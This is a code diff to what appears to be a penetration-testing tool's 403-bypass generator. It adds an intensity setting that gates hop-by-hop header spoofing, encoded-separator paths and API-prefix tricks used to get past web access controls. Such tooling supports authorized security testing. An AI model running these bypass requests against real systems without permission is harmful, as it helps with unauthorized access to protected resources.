@@ -131,7 +131,8 @@ def _swapcase(p: str) -> str:
 
 
 def variants(path: str, case_insensitive: bool = False,
-             header_pairs: list[tuple[str, str]] | None = None,
+             header_pairs: list[tuple[str, str]] | None = None, *,
+             intensity: str = "auto", encoded: bool = True, api: bool = True,
              ) -> list[tuple[str, str, str, dict]]:
     """Curated 403-bypass attempts for `path` (deduped, order = likelihood).
 
@@ -141,9 +142,19 @@ def variants(path: str, case_insensitive: bool = False,
 
     `header_pairs` (from `load_header_pairs`, i.e. `--bypass-headers`) REPLACES
     the built-in IP-trust header axis with the user's curated list — the path,
-    URL-override and method tricks are kept. The list is a superset of the
-    built-ins, so swapping (not adding) avoids re-firing the same attempts.
+    URL-override and method tricks are kept.
+
+    `intensity` controls the advanced families on top of the always-on core
+    (path tricks / IP+override headers / method swap):
+      * "light" — core only (fewest requests, classic high-signal);
+      * "auto"  — core + hop-by-hop (universal) + encoded-separator IF `encoded`
+                  + API-prefix IF `api` (the gates are set from the fingerprint by
+                  the caller, so stack-specific tricks fire only where they fit);
+      * "full"  — everything, gates ignored (exhaustive).
     """
+    inc_hop = intensity in ("auto", "full")
+    inc_enc = intensity == "full" or (intensity == "auto" and encoded)
+    inc_api = intensity == "full" or (intensity == "auto" and api)
     p = "/" + path.lstrip("/")
     body = p.lstrip("/")
     out: list[tuple[str, str, str, dict]] = []
@@ -190,30 +201,34 @@ def variants(path: str, case_insensitive: bool = False,
     # --- hop-by-hop bypass (BruteLogic) — spoof a trusted value AND name it in
     # Connection so the edge allows then strips it (proxy-chain desync); plus a
     # pure-strip set and one batch strip of the whole proxy-header surface ---
-    for h, val in _HOP_SPOOF.items():
-        add(f"hop-by-hop spoof+strip {h}", "GET", p, {h: val, "Connection": f"close, {h}"})
-    for h in _HOP_STRIP:
-        add(f"hop-by-hop strip {h}", "GET", p, {"Connection": f"close, {h}"})
-    add("hop-by-hop strip proxy-set", "GET", p,
-        {"Connection": "close, " + ", ".join(_HOP_SPOOF)})
+    if inc_hop:
+        for h, val in _HOP_SPOOF.items():
+            add(f"hop-by-hop spoof+strip {h}", "GET", p, {h: val, "Connection": f"close, {h}"})
+        for h in _HOP_STRIP:
+            add(f"hop-by-hop strip {h}", "GET", p, {"Connection": f"close, {h}"})
+        add("hop-by-hop strip proxy-set", "GET", p,
+            {"Connection": "close, " + ", ".join(_HOP_SPOOF)})
 
     # --- encoded-separator bypass — overlong/fullwidth/%u slashes the ACL won't
-    # match but a downstream normalizer decodes (leading, trailing, and mid-path) ---
-    for sep in _ENC_SEP:
-        add(f"enc-sep {p}{sep}", "GET", p + sep, {})
-        add(f"enc-sep /{sep}{body}", "GET", "/" + sep + body, {})
-    if "/" in body:
-        head, _, tail = body.rpartition("/")
+    # match but a downstream normalizer decodes (leading, trailing, and mid-path).
+    # Gated to IIS/Tomcat/Java/unknown stacks (where such normalizers live). ---
+    if inc_enc:
         for sep in _ENC_SEP:
-            add(f"enc-sep mid {sep}", "GET", "/" + head + sep + tail, {})
+            add(f"enc-sep {p}{sep}", "GET", p + sep, {})
+            add(f"enc-sep /{sep}{body}", "GET", "/" + sep + body, {})
+        if "/" in body:
+            head, _, tail = body.rpartition("/")
+            for sep in _ENC_SEP:
+                add(f"enc-sep mid {sep}", "GET", "/" + head + sep + tail, {})
 
     # --- API version-prefix bypass — add a version segment the ACL may not cover,
-    # and (if the path already has one) strip it ---
-    for ver in _API_PREFIXES:
-        add(f"api-prefix /{ver}{p}", "GET", f"/{ver}{p}", {})
-    stripped = _VER_SEG.sub("", p, count=1)
-    if stripped and stripped != p:
-        add(f"api-strip {stripped}", "GET", stripped, {})
+    # and (if the path already has one) strip it. Gated to API-ish targets. ---
+    if inc_api:
+        for ver in _API_PREFIXES:
+            add(f"api-prefix /{ver}{p}", "GET", f"/{ver}{p}", {})
+        stripped = _VER_SEG.sub("", p, count=1)
+        if stripped and stripped != p:
+            add(f"api-strip {stripped}", "GET", stripped, {})
 
     # --- method swap (only verbs that can return the *content*; HEAD/OPTIONS
     # return no body and TRACE just echoes, so they'd be false bypasses). Verb
